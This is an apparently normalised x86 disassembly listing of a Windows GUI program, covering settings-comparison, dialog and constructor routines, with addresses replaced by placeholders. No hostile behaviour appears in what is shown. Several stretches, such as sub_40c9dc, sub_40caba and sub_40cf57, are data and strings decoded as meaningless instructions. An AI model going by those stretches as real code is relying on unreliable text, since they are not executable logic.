mov eax [ esi + 0x3f0 ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
movsx ecx [ ebx ]
cmp ecx 0xd
jne r-xdata
or al 0x0
pop ebx
pop ebp
retn 0x4
push 0x0
push 0x0
push 0x28
mov eax ebx
call sub_496868
push eax
call PostMessageA
sub_40c530
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov eax [ ebx + 0x408 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov cl [ esi + 0x1a90c ]
cmp al cl
je r-xdata
mov eax ebx
call sub_40a44c
pop esi
pop ebx
retn
mov eax [ ebx + 0x408 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ esi + 0x1a90c ] al
mov [ esi ] 0x1
sub_40c578
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov eax [ ebx + 0x494 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov cl [ esi + 0x1a90d ]
cmp al cl
je r-xdata
mov eax ebx
call sub_40a44c
pop esi
pop ebx
retn
mov eax [ ebx + 0x494 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ esi + 0x1a90d ] al
mov [ esi ] 0x1
sub_40c5c0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
lea eax [ ebp - 0x8 ]
xor ecx ecx
mov esi [ edx + 0x8 ]
mov [ ebp - 0x24 ] 0xc
mov edx rw-data
call sub_4d25d8
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x3f4 ]
lea eax [ ebp - 0x4 ]
mov edi [ edx + 0x280 ]
mov [ ebp - 0x4 ] ecx
inc [ ebp - 0x18 ]
push edi
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x18 ]
xor edx edx
mov [ ebp - 0xc ] edx
inc [ ebp - 0x18 ]
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x18 ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
call sub_41e604
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x18 ]
mov edx [ ecx ]
mov eax [ ebx + 0x3f8 ]
call sub_48dfa0
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x3f4 ]
mov eax [ ecx + 0x280 ]
add eax eax
lea eax [ eax + eax * 4 ]
mov edx [ esi + 0x1a910 ]
cmp eax edx
je r-xdata
mov ecx [ ebp - 0x34 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x1a910 ] eax
mov [ esi ] 0x1
sub_40c6d8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
lea eax [ ebp - 0x8 ]
xor ecx ecx
mov esi [ edx + 0x8 ]
mov [ ebp - 0x24 ] 0xc
mov edx rw-data
call sub_4d25d8
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x484 ]
lea eax [ ebp - 0x4 ]
mov edi [ edx + 0x280 ]
mov [ ebp - 0x4 ] ecx
inc [ ebp - 0x18 ]
push edi
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x18 ]
xor edx edx
mov [ ebp - 0xc ] edx
inc [ ebp - 0x18 ]
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x18 ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
call sub_41e604
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x18 ]
mov edx [ ecx ]
mov eax [ ebx + 0x480 ]
call sub_48dfa0
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x484 ]
mov eax [ ecx + 0x280 ]
add eax eax
lea eax [ eax + eax * 4 ]
mov edx [ esi + 0x1a914 ]
cmp eax edx
je r-xdata
mov ecx [ ebp - 0x34 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x1a914 ] eax
mov [ esi ] 0x1
sub_40c7f0
push ebx
push esi
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
mov eax [ esi + 0x418 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov ecx [ ebx + 0x1a918 ]
cmp eax ecx
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x418 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x1a918 ] eax
mov [ ebx ] 0x1
sub_40c868
push ebx
mov ebx eax
mov eax [ ebx + 0x4a0 ]
xor edx edx
mov dl [ eax + 0x34 ]
cmp edx 0x1
sbb edx edx
neg edx
call sub_465f5c
mov ecx [ ebx + 0x4a0 ]
mov eax rw-data
mov edx rw-data
mov cl [ ecx + 0x34 ]
test cl cl
je r-xdata
pop ebx
retn
push 0x0
mov ecx [ rw-data ]
mov ecx [ ecx ]
xchg ecx eax
call sub_4826f8
sub_40c8ac
push ebx
mov ebx eax
mov eax [ ebx + 0x49c ]
xor edx edx
mov dl [ eax + 0x34 ]
cmp edx 0x1
sbb edx edx
neg edx
call sub_465f5c
mov ecx [ ebx + 0x49c ]
mov edx [ rw-data ]
mov al [ ecx + 0x34 ]
mov [ edx + 0x3d ] al
mov [ rw-data ] al
pop ebx
retn
sub_40c90c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call sub_41c554
mov ebx eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] 0xc
lea esi [ ebx + 0x380 ]
mov edx rw-data
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x24 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x18 ]
mov edx [ eax ]
mov eax ebx
call sub_48dfa0
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x100 ]
mov esi ebx
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov edx [ ebp - 0x34 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x3c
mov edx 0x3
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x24 ] 0x24
sub_40c9dc
or [ eax ] al
add [ eax ] al
add [ eax + edx ] al
add [ eax + 0x20040d0 ] dh
add [ eax ] al
add [ esp + edx * 2 + 0x65 ] dl
js r-xdata
add eax [ eax ]
add [ eax ] al
inc esp
imul esp [ ecx + 0x6c ] 0x2a20676f
pop ebx
xor bl [ ebp ]
nop
nop
nop
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x2c ] 0xc
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call sub_40173c
mov edx eax
mov [ ebp - 0x8 ] edx
mov eax edx
inc [ ebp - 0x20 ]
mov [ ebp - 0x2c ] 0x18
mov edx [ eax ]
call [ edx + 0x100 ]
dec [ ebp - 0x20 ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
mov [ ebp - 0x2c ] 0x18
mov eax [ ebp - 0x3c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
mov edi ebx
mov [ ebp - 0x18 ] edi
test edi edi
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x2c ] 0x24
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x2c ] 0x3c
mov edx 0x3
sub_40ca9b
inc [ edi ]
add [ eax ] al
add [ eax + eax + 0x7c ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
iretd
sub_40caba
inc eax
add [ ecx ] al
add [ eax + 0x64747300 ] al
cmp bh [ edx ]
jne r-xdata
imul esi [ ecx + 0x75 ] 0x74705f65
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
add [ eax + edx ] al
push esp
inc ecx
bound ebp [ edi + 0x75 ]
je r-xdata
les ecx [ eax ]
outsd
js r-xdata
add ah ah
sbb [ eax ] al
add al [ eax ]
add [ eax ] al
push esp
inc ecx
bound ebp [ edi + 0x75 ]
je r-xdata
add al 0x10
outsd
js r-xdata
and [ ecx - 0x17afffb2 ] cl
sub bl [ ebx + 0x32 ]
pop ebp
add [ eax + 0x4d94c768 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
retn
inc [ ebx + 0x68c308c4 ]
xor al 0x95
dec ebp
add [ ecx + rw-data ] ah
push eax
call sub_4047f4
add esp 0x8
pushfd
jl r-xdata
dec esi
cmp bh [ fs : edx ]
popa
jne r-xdata
add [ eax - 0x18 ] dl
je r-xdata
or bl al
push rw-data
mov eax [ rw-data ]
insb
je r-xdata
push eax
call sub_4047f4
add esp 0x8
retn
cmp al 0x54
inc ecx
bound ebp [ edi + 0x75 ]
je r-xdata
add [ ecx + rw-data ] ah
push eax
call sub_4047f4
add esp 0x8
retn
dec ebp
outsd
js r-xdata
xchg esp eax
and [ esi ] bh
add [ eax ] al
cmp al dl
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] al
sub_40cb8c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x2c ] 0xc
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call sub_417630
mov edx eax
mov [ ebp - 0x8 ] edx
mov eax edx
inc [ ebp - 0x20 ]
mov [ ebp - 0x2c ] 0x18
mov edx [ eax ]
call [ edx + 0x100 ]
dec [ ebp - 0x20 ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
mov [ ebp - 0x2c ] 0x18
mov eax [ ebp - 0x3c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
mov edi ebx
mov [ ebp - 0x18 ] edi
test edi edi
je r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x2c ] 0x3c
mov edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x2c ] 0x24
sub_40cc96
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add al 0x10
add al al
into
inc eax
add [ edx ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x70 ] dl
jo r-xdata
add [ ebx + ebx * 8 - 0x3899b08c ] al
inc ebp
in al 0xc
add [ edx + rw-data ] bh
imul ebp [ esi + 0x6b ] 0x6c616944
outsd
and [ bp + si ] ch
pop ebx
xor bl [ ebp ]
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
xor edx edx
mov eax [ esi + 0x46c ]
mov dl [ ebx + 0x34 ]
cmp edx 0x1
sbb ecx ecx
neg ecx
mov ebx ecx
mov edx ebx
call sub_465f5c
mov edx ebx
mov eax [ esi + 0x474 ]
call sub_465f5c
test bl bl
je r-xdata
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x3ed
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x3eb
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov [ ebp - 0x1c ] 0xc
mov edx rw-data
sub_40cdc0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
xor edx edx
mov eax [ esi + 0x470 ]
mov dl [ ebx + 0x34 ]
cmp edx 0x1
sbb ecx ecx
neg ecx
mov ebx ecx
mov edx ebx
call sub_465f5c
mov edx ebx
mov eax [ esi + 0x478 ]
call sub_465f5c
test bl bl
je r-xdata
mov [ ebp - 0x1c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x3fa
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
call sub_40f8a0
mov [ ebp - 0x1c ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov edx [ eax ]
push edx
push rw-data
push 0x3f7
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
call sub_40f818
jmp r-xdata
mov eax esi
call sub_409ba0
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40cec0
add al 0x0
add [ eax ] al
nop
add [ eax + eax ] cl
movsb [ edi ] [ esi ]
rol [ eax ] cl
push esp
inc ecx
jo r-xdata
add [ eax ] al
add [ eax ] al
dec esp
imul ebp [ esi + 0x6b ] 0x6c616944
outsd
and [ bp + si ] ch
add [ eax - 0x74aa6f70 ] dl
in al dx
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
mov edi [ ebx + 0x8 ]
test edi edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi edi
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push ebx
call sub_4b0180
pop ecx
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x24
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
sub_40cf57
inc [ 0x6c000000 ]
add [ eax + eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
push ebp
outsb
imul esi [ ecx + 0x75 ] 0x74705f65
jb r-xdata
or al ch
0x85000b81 0x74db
inc ecx
bound esp [ ecx + 0x73 ]
cmp al 0x54
inc ecx
jo r-xdata
test [ ebp + 0xc ] 0x1
mov esi edi
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
shl [ ecx - 0x75 ] 0x55
clc
dec esp
imul ebp [ esi + 0x6b ] 0x6c616944
outsd
sub al 0x73
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_4b0180
pop ecx
mov ecx [ edx ]
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x24
mov edx 0x3
and [ ebx + 0xa8bf855 ] ecx
cmp bh [ edx ]
popa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
add eax [ eax ]
add [ eax ] al
je r-xdata
or cl [ ecx - 0x389903b3 ]
inc ebp
in al 0x24
add [ edx + 0x3 ] bh
insb
je r-xdata
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
add [ eax ] al
add [ ebx + 0x88bf845 ] cl
cmp al 0x54
inc ecx
jo r-xdata
je r-xdata
add dh dh
inc ebp
or al 0x1
dec esp
imul ebp [ esi + 0x6b ] 0x6c616944
outsd
and [ 0x0 ] bh
pop eax
rol [ eax ] cl
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov edi [ ebx + 0x8 ]
test edi edi
je r-xdata
sub_40d263
inc [ ecx ]
add [ eax ] al
add [ eax + eax + 0x48 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax esi
call sub_401f40
sub al 0x1d
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
insb
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4d36a4
add esp 0xffffffdc
push ebx
push esi
call sub_4d36b1
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
cmp al 0x54
inc ecx
jo r-xdata
dec esp
imul ebp [ esi + 0x6b ] 0x6c616944
outsd
add [ bx + si ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3000003 ] ch
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x40000000 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
add [ eax ] al
adc al [ eax ]
add [ eax ] al
cld
rol [ eax ] cl
add eax [ eax ]
push esp
add [ ecx + eax * 2 + 0x70 ] dl
jo r-xdata
dec esp
imul ebp [ esi + 0x6b ] 0x6c616944
outsd
add [ bx + si ] al
sub_40d344
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
call sub_4d36b1
mov ebx edx
mov edi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
test bl bl
jle r-xdata
dec [ ebp - 0x8 ]
lea esi [ edi + 0x380 ]
dec [ ebp - 0x8 ]
xor edx edx
mov eax esi
call sub_4d2728
sub [ ebp - 0x8 ] 0x11
xor edx edx
mov eax edi
call sub_401f40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_4d36a4
sub_40d3c4
push ebp
mov ebp esp
add esp 0xffffffc8
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x28 ] 0xc
push rw-data
call sub_41bbd4
pop ecx
call sub_41cc00
push 0x40
call sub_4bbbac
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x28 ] 0x30
mov edx [ ebp - 0x8 ]
push edx
call sub_404588
pop ecx
mov [ ebp - 0x28 ] 0x18
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx ]
call sub_482354
mov [ ebp - 0x28 ] 0x3c
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x1c ]
mov edx [ eax ]
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_481dfc
dec [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov ecx [ rw-data ]
mov eax [ ecx ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
call sub_48236c
mov eax [ rw-data ]
mov dl [ eax + 0xe ]
test dl dl
jne r-xdata
mov [ rw-data ] ebx
mov eax ebx
call sub_404a7c
test eax eax
jne r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov [ ebp - 0x28 ] 0x6c
push 0x3
mov eax [ ebp - 0x14 ]
push eax
call sub_404758
mov [ ebp - 0x28 ] 0x54
add esp 0x8
mov [ ebp - 0x28 ] 0x48
mov edx rw-data
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
inc [ ebp - 0x1c ]
mov edx [ eax ]
push edx
push rw-data
push 0x27
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x1c ]
dec [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
mov ecx [ rw-data ]
mov eax [ ecx ]
mov [ eax + 0x57 ] 0x0
call sub_481adc
mov ecx [ ebp + 0x14 ]
cmp ecx 0x7
jne r-xdata
xor eax eax
mov edx [ ebp - 0x38 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ rw-data ]
mov eax [ edx ]
call sub_4824bc
jmp r-xdata
sub_40d5e2
mov edx [ rw-data ]
mov eax [ edx ]
mov edx [ ebp - 0x4 ]
call sub_482884
mov [ ebp - 0x28 ] 0x14
call sub_4d1d58
xor eax eax
mov edx [ ebp - 0x38 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_40d614
push ebp
mov ebp esp
add esp 0xfffffbdc
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
lea edi [ ebp - 0x424 ]
mov esi rw-data
mov ecx 0x100
mov eax ebx
[ edi ] [ esi ]
mov [ ebp - 0x14 ] 0xc
sar eax 0x8
sub eax 0x1
jb r-xdata
mov eax [ ebp + ebx * 4 - 0x424 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax rw-data
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
jmp r-xdata
mov eax rw-data
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
sub_40d690
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov eax [ ebp - 0x4 ]
add eax 0x3c
xor edx edx
mov [ eax ] edx
inc [ ebp - 0xc ]
inc [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40d6f0
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40d6f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
xor edx edx
xor ecx ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] ecx
xor eax eax
xor edx edx
mov [ ebx + 0x8 ] eax
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x10 ] edx
xor eax eax
mov [ ebx + 0xc ] edx
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] eax
xor edx edx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x2c ] edx
mov [ ebx + 0x28 ] edx
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x30 ] 0x5f
mov [ ebx + 0x34 ] 0x3f800000
mov [ ebx + 0x38 ] 0x64
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
lea esi [ ebx + 0x3c ]
call sub_4d25d8
inc [ ebp - 0xc ]
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4d2758
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov [ ebx + 0x54 ] 0x0
mov [ ebx + 0x55 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d79c
mov ecx [ eax ]
cmp ecx [ edx ]
je r-xdata
dec ecx
je r-xdata
xor eax eax
retn
mov ecx [ eax + 0xc ]
cmp ecx [ edx + 0xc ]
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ eax + 0x10 ]
cmp ecx [ edx + 0x10 ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x14 ]
mov edx [ edx + 0x14 ]
cmp eax edx
je r-xdata
mov eax 0x1
retn
sub_40d7d4
mov cl [ eax + 0x54 ]
mov [ edx + 0x54 ] cl
mov cl [ eax + 0x55 ]
mov [ edx + 0x55 ] cl
mov cl [ eax + 0x56 ]
mov [ edx + 0x56 ] cl
mov ecx [ eax + 0x58 ]
mov [ edx + 0x58 ] ecx
mov ecx [ eax + 0x5c ]
mov [ edx + 0x5c ] ecx
mov ecx [ eax + 0x60 ]
mov [ edx + 0x60 ] ecx
mov [ eax + 0x54 ] 0x0
mov [ eax + 0x55 ] 0x0
retn
sub_40d804
push ebx
push esi
push edi
mov esi eax
xor edi edi
